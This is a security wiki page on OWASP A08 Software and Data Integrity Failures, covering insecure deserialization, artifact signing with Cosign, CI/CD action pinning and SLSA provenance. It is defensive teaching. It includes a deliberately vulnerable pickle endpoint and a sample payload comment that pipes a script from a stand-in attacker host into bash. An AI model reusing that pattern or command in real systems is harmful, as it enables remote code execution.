---
title: "A08 — Software and Data Integrity Failures"
date: 2026-08-05
tags: ["OWASP", "integrity", "supply-chain", "CI-CD", "deserialization", "update-mechanisms"]
categories: ["owasp"]
description: "OWASP A08 Software and Data Integrity Failures — insecure CI/CD pipelines, insecure deserialization, unsigned updates. Supply chain integrity and code signing."
showToc: true
layout: "single"
---

## Overview

A08 (new in 2021) focuses on code and infrastructure that does not protect against integrity violations. This includes insecure CI/CD pipelines, use of untrusted plugins, insecure deserialization, and auto-update mechanisms that deliver unsigned updates. The SolarWinds attack is the defining example.

| Attribute | Detail |
|---|---|
| OWASP rank | #8 (new category in 2021) |
| STRIDE mapping | **Tampering** |
| CWEs mapped | 10 (incl. CWE-502, CWE-829, CWE-345) |
| Famous example | SolarWinds SUNBURST — malicious update delivered to 18,000 organisations |

---

## Attack patterns

- **Insecure deserialization** — deserializing untrusted data leads to RCE
- **Unsigned updates** — application accepts software updates without signature verification
- **Compromised CI/CD** — build pipeline injects malicious code into artifacts
- **Malicious plugins/modules** — importing untrusted code into application
- **Dependency confusion** — attacker publishes malicious package with same name as internal package

---

## Insecure deserialization

```python
import pickle
import json
import hmac
import hashlib

# VULNERABLE — deserializing user-supplied pickle data
@app.post("/load-session")
def load_session(data: bytes = Body()):
    session = pickle.loads(data)     # RCE: attacker crafts malicious pickle
    return session

# Malicious pickle payload:
# import os; os.system('curl attacker.com/shell.sh | bash')
# Serialized as pickle bytes and sent in request body

# SAFE — use JSON with strict schema validation
from pydantic import BaseModel

class SessionData(BaseModel):
    user_id: int
    roles: list[str]
    expires: str

@app.post("/load-session")
def load_session(data: SessionData):    # Pydantic validates the schema
    # Only known fields accepted — no code execution possible
    return {"user_id": data.user_id}

# If you must use serialization — sign the data
SECRET_KEY = b"loaded-from-secrets-manager"

def serialize_signed(data: dict) -> str:
    payload = json.dumps(data).encode()
    sig = hmac.new(SECRET_KEY, payload, hashlib.sha256).hexdigest()
    return base64.b64encode(payload).decode() + "." + sig

def deserialize_signed(token: str) -> dict:
    try:
        payload_b64, sig = token.rsplit(".", 1)
        payload = base64.b64decode(payload_b64)
        expected_sig = hmac.new(SECRET_KEY, payload, hashlib.sha256).hexdigest()
        if not hmac.compare_digest(sig, expected_sig):
            raise ValueError("Invalid signature")
        return json.loads(payload)
    except Exception:
        raise ValueError("Invalid token")
```

### Artifact signing with Cosign

```bash
# Sign container image after build
cosign sign --yes \
  --key cosign.key \
  myregistry.io/myapp:v1.2.3

# Verify before deployment (in admission controller or CD pipeline)
cosign verify \
  --key cosign.pub \
  myregistry.io/myapp:v1.2.3

# Keyless signing using OIDC (no key management)
# GitHub Actions:
cosign sign --yes myregistry.io/myapp:${{ github.sha }}
# Verification:
cosign verify \
  --certificate-identity "https://github.com/myorg/myapp/.github/workflows/release.yml@refs/heads/main" \
  --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
  myregistry.io/myapp:v1.2.3
```

### CI/CD pipeline integrity

```yaml
# Pin ALL GitHub Actions to commit SHA — not mutable tags
# WRONG: uses: actions/checkout@v4        # tag can be moved
# RIGHT: uses: actions/checkout@11d5960a  # immutable SHA

name: Secure build pipeline
on: [push]

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read          # minimal permissions
      packages: write         # only what's needed
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262  # SHA pin

      - name: Verify dependency integrity
        run: |
          pip install --require-hashes -r requirements.txt

      - name: Build with SLSA provenance
        uses: slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@v1.10.0

      - name: Sign image
        run: cosign sign --yes myapp:${{ github.sha }}
```

---

## Detection & testing

```bash
# Check for insecure deserialization
# Test: send malformed serialized objects
# Python pickle: use pickletools to inspect before loading
python3 -c "import pickletools; pickletools.dis(open('suspicious.pkl','rb'))"

# Check image signatures
cosign verify myregistry.io/myapp:latest 2>&1 | head -5
# Should show: verified OK with signing certificate

# Verify SLSA provenance
slsa-verifier verify-image myregistry.io/myapp:latest \
  --source-uri "github.com/myorg/myapp" \
  --builder-id "https://github.com/slsa-framework/slsa-github-generator"

# Check pipeline for unpinned actions
grep -r "uses:" .github/workflows/ | grep -v "@[a-f0-9]\{40\}"
# Any result = unpinned action = integrity risk
```

---

## Prevention checklist

```
□ Never deserialize data from untrusted sources using native serializers (pickle, Java serialization)
□ Use JSON with strict schema validation for all data exchange
□ Sign all build artifacts (containers, binaries, packages) with Cosign/Sigstore
□ Verify artifact signatures before deployment
□ Pin all CI/CD action dependencies to commit SHAs
□ SBOM generated and signed for every release
□ Implement SLSA provenance for critical build pipelines
□ Review all third-party integrations and plugins before use
□ Monitor CI/CD pipeline access and alert on unexpected changes
□ Implement GitOps — all deployment changes via reviewed PRs, not manual
```

<div class="references-section">

## 📚 Related pages

<div class="ref-grid">
  <a class="ref-card" href="/wiki/supply-chain/"><span class="ref-label">Wiki</span>Supply Chain Security</a>
  <a class="ref-card" href="/wiki/owasp-top10/a06-vulnerable-components/"><span class="ref-label">OWASP</span>A06 Vulnerable Components</a>
  <a class="ref-card" href="/wiki/secure-architecture/container-security/"><span class="ref-label">Architecture</span>Container Security</a>
  <a class="ref-card" href="/wiki/owasp-top10/"><span class="ref-label">OWASP</span>OWASP Top 10 Overview</a>
  <a class="ref-card" href="/wiki/stride/"><span class="ref-label">Framework</span>STRIDE — Tampering</a>
  <a class="ref-card" href="/wiki/advisory-assurance/tod/"><span class="ref-label">Assurance</span>Test of Design</a>
</div>

</div>
